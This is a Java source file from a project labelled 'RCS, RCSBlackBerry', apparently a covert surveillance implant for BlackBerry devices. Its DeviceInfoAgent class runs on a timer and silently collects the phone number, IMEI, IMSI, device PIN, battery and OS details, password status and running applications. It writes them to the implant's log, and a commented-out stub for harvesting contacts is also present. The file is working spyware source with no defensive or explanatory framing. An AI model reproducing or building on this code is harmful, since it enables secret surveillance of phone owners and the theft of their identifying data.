/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : DeviceInfoAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.io.EOFException;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.util.DataBuffer;
import blackberry.Device;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class DeviceInfoAgent.
 */
public final class DeviceInfoAgent extends Agent {
    // #debug
    static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);

    Device device;
    boolean runningApplication;
    boolean installedApplication;

    /**
     * Instantiates a new device info agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public DeviceInfoAgent(final boolean agentStatus) {
        super(AGENT_DEVICE, agentStatus, true, "DeviceInfoAgent");
        // #ifdef DBC
        Check.asserts(Log.convertTypeLog(agentId) == LogType.DEVICE,
                "Wrong Conversion");
        // #endif

        device = Device.getInstance();
    }

    /**
     * Instantiates a new device info agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected DeviceInfoAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        // #debug debug
        debug.trace("run");

        // #ifdef DBC
        Check.requires(log != null, "Null log");
        // #endif

        log.createLog(null);

        boolean ret = true;

        final StringBuffer sb = new StringBuffer();

        // Modello
        sb.append("Processor: ARM\n");
        sb.append("Simultator: " + DeviceInfo.isSimulator() + "\n");
        sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
        sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
        sb.append("Pin: " + DeviceInfo.getDeviceId() + "\n");

        // Alimentazione
        sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "\n");
        sb.append("BatteryStatus: " + DeviceInfo.getBatteryStatus() + "\n");
        sb.append("BatteryTemperature: " + DeviceInfo.getBatteryTemperature()
                + "\n");
        sb.append("BatteryVoltage: " + DeviceInfo.getBatteryVoltage() + "\n");

        // #ifdef HAVE_MIME
        // DISK
        sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + "\n");
        // #endif

        // OS Version
        sb.append("OS: " + DeviceInfo.getPlatformVersion() + "\n");

        // Device
        sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
        sb.append("IMEI: " + device.getImei() + "\n");
        sb.append("IMSI: " + device.getImsi() + "\n");
        sb.append("Phone: " + device.getPhoneNumber() + "\n");

        sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
        sb.append("SoftwareVersion: " + DeviceInfo.getSoftwareVersion() + "\n");
        sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
        sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");

        sb.append(getRunningApplications());

        ret = log.writeLog(sb.toString(), true);

        if (ret == false) {
            // #debug
            debug.error("Error writing file");
        }

        log.close();

    }

    /**
     * Gets the contacts.
     * 
     * @return the contacts
     */
    String getContacts() {
        final StringBuffer sb = new StringBuffer();
        sb.append("\r\nContacts: \r\n");

        /*
         * BlackBerryContact blackBerryContact = (BlackBerryContact) context;
         * //Get the PIMList. It is useful for getting the labels for
         * //Each phone field
         * PIMList pimList = blackBerryContact.getPIMList();
         * if (blackBerryContact != null) {
         * //How many phone numbers does this contact have?
         * int phoneCount = blackBerryContact.countValues(Contact.TEL);
         * //Setup variables to hold the numbers and their labels.
         * String[] phoneNumbers = new String[phoneCount];
         * String[] labels = new String[phoneCount];
         * for (int i = 0; i > phoneCount; i++) {
         * //Fetch the phone number
         * String phoneNumber = blackBerryContact.getString(Contact.TEL, i);
         * //Determine the label for that number.
         * String label =
         * pimList.getAttributeLabel(blackBerryContact.getAttributes
         * (Contact.TEL, i));
         * //Add the number and label to the array.
         * phoneNumbers[i] = phoneNumber;
         * labels[i] = label + ":" + phoneNumber;
         * }
         * if (phoneCount == 0) {
         * ..Handle the case when there is no number..
         * }
         * else if (phoneCount == 1) {
         * ..Handle the number for
         * phoneNumbers[0]..
         * }
         * else {
         * //Create a dialog to ask the user which number they
         * //would like to use
         * int choice = Dialog.ask("Which Number?", labels, 0);
         * if (choice > -1 && choice < style="font-style: italic;">.. Handle the
         * number for phoneNumbers[choice]..
         * }
         * else {
         * ..Handle the case when the user doesn't pick a number..
         * }
         * }
         */

        return sb.toString();
    }

    /**
     * Gets the running applications.
     * 
     * @return the running applications
     */
    String getRunningApplications() {
        final StringBuffer sb = new StringBuffer();
        sb.append("\r\nRunning applications: \r\n");

        final ApplicationManager manager = ApplicationManager
                .getApplicationManager();

        // Check to see if application is running.
        final ApplicationDescriptor[] descriptors = manager
                .getVisibleApplications();
        // Retrieve the name of a running application.
        for (int i = 0; i < descriptors.length; i++) {
            final ApplicationDescriptor descriptor = descriptors[i];
            sb.append(descriptor.getName());
            sb.append("\r\n");
        }

        return sb.toString();
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            installedApplication = databuffer.readBoolean();
            runningApplication = installedApplication;
        } catch (final EOFException e) {
            return false;
        }
        
        //#debug info
        debug.info("installedApplication: " + installedApplication);
        
        return true;
    }

}
